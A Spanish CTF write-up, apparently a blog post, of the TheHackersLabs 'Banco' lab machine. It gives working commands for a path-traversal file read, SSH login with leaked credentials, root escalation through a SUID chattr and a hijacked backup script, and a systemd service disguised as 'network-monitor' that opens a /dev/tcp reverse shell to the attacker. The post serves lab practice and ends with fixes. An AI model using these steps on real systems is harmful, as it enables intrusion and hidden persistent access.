---
title: "TheHackersLabs: Banco"
date: 2026-08-09
draft: false
tags: ["ctf", "thehackerslabs", "lfi", "path-traversal", "privilege-escalation", "chattr", "persistencia"]
categories: ["writeups"]
summary: "Recorrido completo de la máquina Banco de TheHackersLabs: explotación de un LFI en un descargador de PDF, filtrado de credenciales desde una base de datos JSON, escalada de privilegios abusando de chattr con bit SUID y persistencia mediante un servicio systemd."
---

*Un recorrido completo de la máquina Banco, detallando la explotación de una vulnerabilidad de Inclusión Local de Archivos (LFI) en un descargador de PDF, la recopilación de credenciales desde una base de datos expuesta, la escalada de privilegios mediante el bit SUID sobre `chattr` y el secuestro de un script mutable, y el establecimiento de persistencia sobre el sistema comprometido.*

**Publicado el 9 de agosto de 2026 · Por Ne0t3k · 8 minutos de lectura**

La máquina Banco de TheHackersLabs plantea una cadena de ataque que arranca con un escaneo de superficie convencional y termina con control total del sistema. El punto de entrada es un formulario de descarga de informes en PDF vulnerable a Local File Inclusion (LFI) mediante path traversal, que permite filtrar tanto la configuración de la aplicación como una base de datos en JSON con credenciales de usuario. A partir de ahí, el acceso SSH conduce a una escalada de privilegios por una mala configuración de permisos SUID sobre `chattr`, que habilita el secuestro de un script de backup ejecutado periódicamente como root. El compromiso se cierra con el despliegue de un mecanismo de persistencia a nivel de sistema.

IP objetivo: `10.0.2.15`. IP atacante: `10.0.2.20`.

## Reconocimiento — Escaneo de puertos

El primer paso es un escaneo SYN exhaustivo sobre los 65.535 puertos TCP para mapear la superficie de ataque inicial:

<pre class="term-log">
<span class="cmd">$ sudo nmap -sS -p- --open --min-rate 5000 -vvv -n -oA banco-allports 10.0.2.15</span>
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-09 04:46 -0400
Initiating ARP Ping Scan at 04:46
Completed ARP Ping Scan at 04:46, 0.04s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 04:46
<span class="hl">Discovered open port 80/tcp on 10.0.2.15</span>
<span class="hl">Discovered open port 22/tcp on 10.0.2.15</span>
Completed SYN Stealth Scan at 04:47, 18.68s elapsed (65535 total ports)
Not shown: 62907 closed tcp ports (reset), 2626 filtered tcp ports (no-response)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: 08:00:27:08:09:0D (Oracle VirtualBox virtual NIC)
Nmap done: 1 IP address (1 host up) scanned in 18.81 seconds
</pre>

Con los puertos localizados, una segunda pasada identifica servicio y versión exacta:

<pre class="term-log">
<span class="cmd">$ sudo nmap -sC -sV -p22,80 -oA banco-services 10.0.2.15</span>
PORT   STATE SERVICE VERSION
<span class="hl">22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u9 (protocol 2.0)</span>
<span class="hl">80/tcp open  http    Apache httpd 2.4.66 ((Debian))</span>
|_http-title: Banco de España | Portal Corporativo
|_http-server-header: Apache/2.4.66 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
Nmap done: 1 IP address (1 host up) scanned in 11.94 seconds
</pre>

El escaneo revela dos puertos TCP abiertos:

- **Puerto 22 (SSH)**: OpenSSH 9.2p1 sobre Debian, para acceso remoto seguro.
- **Puerto 80 (HTTP)**: Apache 2.4.66, alojando el portal "Banco de España | Portal Corporativo".

## Web — Fuerza bruta de directorios

Para mapear la estructura del servidor, se ejecuta un escaneo de directorios y archivos con extensiones habituales de backend:

<pre class="term-log">
<span class="cmd">$ feroxbuster --url http://10.0.2.15 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,js -t 50 -o ferox-banco.log -q</span>
200      GET      730l     1845w    24605c http://10.0.2.15/index.html
<span class="hl">405      GET        1l       11w      102c http://10.0.2.15/descargar.php</span>
200      GET      730l     1845w    24605c http://10.0.2.15/
301      GET        9l       29w      351c http://10.0.2.15/javascript => http://10.0.2.15/javascript/
<span class="hl">200      GET        0l        0w        0c http://10.0.2.15/config.php</span>
</pre>

El descubrimiento revela dos rutas relevantes:

- **`/descargar.php`**: devuelve HTTP 405, indicando que solo acepta un método distinto a GET.
- **`/config.php`**: devuelve HTTP 200 pero sin contenido, señal de que su lógica se ejecuta de forma condicional.

## Web — Análisis del formulario de descarga en PDF

Al navegar directamente a `descargar.php` con GET se recibe un error de método no permitido. Inspeccionando el código fuente de la portada aparece un formulario oculto que envía una petición `POST` con un parámetro `archivo`:

<pre class="term-log">
<span class="cmd">$ curl -s http://10.0.2.15/ -o index_source.html</span>
<span class="cmd">$ grep -i -A 5 "form" index_source.html</span>
Informe institucional
Descargue nuestro informe "Sobre nosotros" (PDF) donde detallamos nuestra trayectoria,
estructura organizativa y funciones clave.
Descargar Informe (PDF)
</pre>

## Explotación — Inclusión Local de Archivos y path traversal

Enviando un nombre de archivo inexistente al parámetro `archivo`, la respuesta filtra un mensaje de depuración con la ruta absoluta del backend:

<pre class="term-log">
<span class="cmd">$ curl -s -X POST http://10.0.2.15/descargar.php --data-urlencode 'archivo=noexiste.pdf'</span>
Informe no disponible
No se ha podido localizar el documento solicitado. Verifique el nombre del archivo.
<span class="hl">Debug (entorno controlado): Ruta buscada: /var/www/html/informes/noexiste.pdf</span>
</pre>

Confirmada la ruta base, se ejecuta el recorrido de directorios hacia `/etc/passwd`:

<pre class="term-log">
<span class="cmd">$ curl -s -X POST http://10.0.2.15/descargar.php --data-urlencode 'archivo=../../../../etc/passwd'</span>
root:x:0:0:root:/root:/bin/bash
...
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
<span class="hl">wvverez:x:1001:1001:wvverez,,,:/home/wvverez:/bin/bash</span>
</pre>

El parámetro también permite leer el código fuente de scripts subiendo un nivel de directorio, sin que se ejecuten como PHP.

## Explotación — Acceso a la base de datos y credenciales

Leyendo `config.php` mediante el mismo vector se filtra una constante crítica:

<pre class="term-log">
<span class="cmd">$ curl -s -X POST http://10.0.2.15/descargar.php --data-urlencode 'archivo=../config.php'</span>
<span class="hl">define('DB_FILE', __DIR__ . '/dbsuperscretinfact.json');</span>
</pre>

Esto apunta a una base de datos en JSON dentro del webroot, descargable con el mismo path traversal:

<pre class="term-log">
<span class="cmd">$ curl -s -X POST http://10.0.2.15/descargar.php --data-urlencode 'archivo=../dbsuperscretinfact.json' -o db_leak.json</span>
<span class="cmd">$ cat db_leak.json | jq .</span>
{
  "users": [
    { "id": 1, "username": "admin", "password": "Admin@2024!Secure#Hash$9921" },
    { "id": 2, "username": "root", "password": "R00t#P@ssw0rd!Secure$9921#XYZ" },
    <span class="hl">{ "id": 3, "username": "wvverez", "password": "dasjbdaDASJDASDA11E1DAJDQA", "ssh_key": "/home/wvverez/.ssh/id_rsa" }</span>,
    ... (9 registros adicionales sin cuenta Unix asociada)
  ]
}
</pre>

De los doce registros filtrados, solo `wvverez` corresponde a un usuario real del sistema, verificado previamente contra `/etc/passwd`.

## Movimiento lateral — Acceso SSH

Con la credencial filtrada, se autentica por SSH como `wvverez`:

<pre class="term-log">
<span class="cmd">$ ssh wvverez@10.0.2.15</span>
Linux TheHackersLabs-Banco 6.1.0-44-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.164-1 (2026-03-09) x86_64

wvverez@TheHackersLabs-Banco:~$ id && hostname
uid=1001(wvverez) gid=1001(wvverez) grupos=1001(wvverez),100(users)
TheHackersLabs-Banco
wvverez@TheHackersLabs-Banco:~$ cat user.txt
<span class="hl-green">THL{dadDADAD...}</span>
</pre>

Flag de usuario localizada en `user.txt`.

## Escalada de privilegios — Enumeración de binarios SUID

Con acceso al sistema, se auditan los binarios con bit SUID:

<pre class="term-log">
<span class="cmd">$ find / -perm /4000 -type f 2>/dev/null</span>
/usr/bin/chsh
/usr/bin/sudo
<span class="hl">/usr/bin/lsattr</span>
<span class="hl">/usr/bin/chattr</span>
/usr/bin/passwd
/usr/bin/mount
/usr/bin/su
...

$ sudo -l
Sorry, user wvverez may not run sudo on TheHackersLabs-Banco.
</pre>

`chattr` y `lsattr` con SUID configurado es una mala práctica de alto riesgo: permite a cualquier usuario sin privilegios añadir o retirar atributos especiales de archivos del sistema, incluida la inmutabilidad. Localizando archivos con ese atributo:

<pre class="term-log">
<span class="cmd">$ find / -type f -exec lsattr {} \; 2>/dev/null | grep '^....i'</span>
<span class="hl">----i---------e------- /usr/local/bin/backup.sh</span>
</pre>

## Escalada de privilegios — Secuestro del script de respaldo inmutable

`backup.sh` respalda periódicamente una base de datos con privilegios de root. Al no poder editarse por su atributo inmutable, se retira aprovechando el SUID de `chattr`:

<pre class="term-log">
<span class="cmd">$ chattr -i /usr/local/bin/backup.sh</span>
<span class="cmd">$ cat /usr/local/bin/backup.sh</span>
#!/bin/bash
BACKUP_DIR="/var/backups"
SOURCE_FILE="/var/www/html/db.json"
DEST_FILE="$BACKUP_DIR/db_backup_$(date +'%Y%m%d_%H%M%S').json"
cp "$SOURCE_FILE" "$DEST_FILE" 2>/dev/null
ls -t $BACKUP_DIR/db_backup_*.json 2>/dev/null | tail -n +11 | xargs rm -f 2>/dev/null
</pre>

Antes de modificarlo se verificó su disparador: no aparece en `crontab`, `cron.d` ni en `systemctl list-timers`; el análisis de `/var/log/backup.log` confirmó ejecuciones cada minuto de forma continua, por lo que el mecanismo exacto de invocación queda fuera de lo observable desde una cuenta sin privilegios. Con el script escribible, se añade el payload de escalada:

<pre class="term-log">
<span class="cmd">$ echo 'chmod +s /bin/bash' >> /usr/local/bin/backup.sh</span>
</pre>

## Flags — Acceso a la shell root

Tras la siguiente ejecución del script, el bit SUID queda aplicado sobre `/bin/bash`:

<pre class="term-log">
<span class="cmd">$ sleep 65 && ls -l /bin/bash</span>
<span class="hl-green">-rwsr-sr-x 1 root root 1265648 sep  7  2025 /bin/bash</span>

<span class="cmd">$ bash -p</span>
bash-5.2# id && whoami
uid=1001(wvverez) gid=1001(wvverez) <span class="hl-green">euid=0(root) egid=0(root)</span>
root
bash-5.2# cat /root/root.txt
<span class="hl-green">THL{dadDADAD...}</span>
</pre>

Control administrativo total confirmado y flag de root localizada en `/root/root.txt`.

## Persistencia — Servicio systemd con reverse shell

Con root confirmado, se despliega un servicio systemd camuflado con nombre neutro, que abre una reverse shell hacia la máquina atacante en cada arranque del sistema:

<pre class="term-log">
<span class="cmd">bash-5.2# cat /etc/systemd/system/network-monitor.service</span>
[Unit]
Description=Network Monitoring Service
After=network.target

[Service]
Type=simple
<span class="hl">ExecStart=/bin/bash -c 'bash -i >&amp; /dev/tcp/10.0.2.20/4444 0>&amp;1'</span>
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target

bash-5.2# systemctl daemon-reload
bash-5.2# systemctl enable network-monitor.service
bash-5.2# systemctl start network-monitor.service
bash-5.2# systemctl is-enabled network-monitor.service
<span class="hl-green">enabled</span>
</pre>

Verificación desde la máquina atacante:

<pre class="term-log">
<span class="cmd">$ nc -lvnp 4444</span>
listening on [any] 4444 ...
<span class="hl-green">connect to [10.0.2.20] from (UNKNOWN) [10.0.2.15] 54816</span>
root@TheHackersLabs-Banco:/#
</pre>

`Restart=always` con `RestartSec=10` mantiene la conexión activa ante interrupciones, y el enlace en `multi-user.target.wants/` garantiza el arranque automático del servicio en cada reinicio del sistema.

## Conclusión

La cadena de compromiso combina tres fallos independientes: validación insuficiente de rutas en `descargar.php`, exposición de credenciales en texto claro dentro del webroot, y una configuración SUID peligrosa sobre `chattr` que permite manipular scripts privilegiados en ejecución periódica. Como medidas correctivas: saneamiento estricto del parámetro `archivo` mediante lista blanca, retirada del bit SUID de `chattr`/`lsattr`, y almacenamiento de credenciales fuera del webroot con hashing adecuado.
